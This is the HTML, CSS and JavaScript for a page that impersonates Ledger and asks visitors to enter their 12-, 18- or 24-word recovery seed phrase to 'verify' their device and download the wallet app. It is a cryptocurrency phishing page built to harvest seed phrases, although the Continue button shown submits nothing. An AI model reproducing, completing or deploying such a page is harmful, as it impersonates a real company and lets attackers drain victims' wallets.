<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verify Seed Phrase - Ledger</title>
  <style>
    body {
      background-color: #0d0d0d;
      color: white;
      font-family: "Courier New", monospace;
      text-align: center;
      margin: 0;
      padding: 0;
    }

    h1 {
      margin-top: 50px;
      font-size: 28px;
      letter-spacing: 2px;
    }

    p {
      color: #ccc;
      margin-bottom: 30px;
      font-size: 14px;
    }

    .word-buttons {
      margin: 20px auto;
      display: flex;
      justify-content: center;
      gap: 15px;
    }

    .word-buttons button {
      background: #1a1a1a;
      color: #fff;
      border: 1px solid #555;
      padding: 10px 20px;
      border-radius: 8px;
      cursor: pointer;
      transition: 0.3s;
    }

    .word-buttons button:hover,
    .word-buttons button.active {
      background: #6c63ff;
      border-color: #6c63ff;
    }

    .phrase-container {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 15px;
      width: 60%;
      margin: 30px auto;
      max-width: 600px;
    }

    .phrase-container input {
      background: #1a1a1a;
      border: 1px solid #444;
      color: white;
      padding: 10px;
      border-radius: 6px;
      text-align: center;
      font-size: 14px;
      outline: none;
      transition: border 0.3s;
    }

    .phrase-container input:focus {
      border-color: #6c63ff;
    }

    .continue-btn {
      background: #6c63ff;
      color: white;
      border: none;
      padding: 12px 35px;
      border-radius: 25px;
      cursor: pointer;
      font-size: 16px;
      margin-top: 20px;
      transition: background 0.3s;
    }

    .continue-btn:hover {
      background: #837dff;
    }

    @media (max-width: 600px) {
      .phrase-container {
        grid-template-columns: repeat(2, 1fr);
        width: 80%;
      }
    }
  </style>
</head>
<body>
  <h1>VERIFY SEED PHRASE OF YOUR DEVICE</h1>
  <p>Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.<br>
  **Ledger does not keep a copy of your recovery phrase.<br>
  **ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.</p>

  <div class="word-buttons">
    <button onclick="generateInputs(12)" class="active">12 Words</button>
    <button onclick="generateInputs(18)">18 Words</button>
    <button onclick="generateInputs(24)">24 Words</button>
  </div>

  <div id="phraseContainer" class="phrase-container"></div>

  <button class="continue-btn">Continue...</button>

  <script>
    const phraseContainer = document.getElementById('phraseContainer');
    const buttons = document.querySelectorAll('.word-buttons button');

    function generateInputs(count) {
      phraseContainer.innerHTML = '';
      for (let i = 1; i <= count; i++) {
        const input = document.createElement('input');
        input.type = 'text';
        input.placeholder = i;
        phraseContainer.appendChild(input);
      }

      // active button highlight
      buttons.forEach(btn => btn.classList.remove('active'));
      event.target.classList.add('active');
    }

    // default load: 12 words
    window.onload = () => generateInputs(12);
  </script>
</body>
</html>
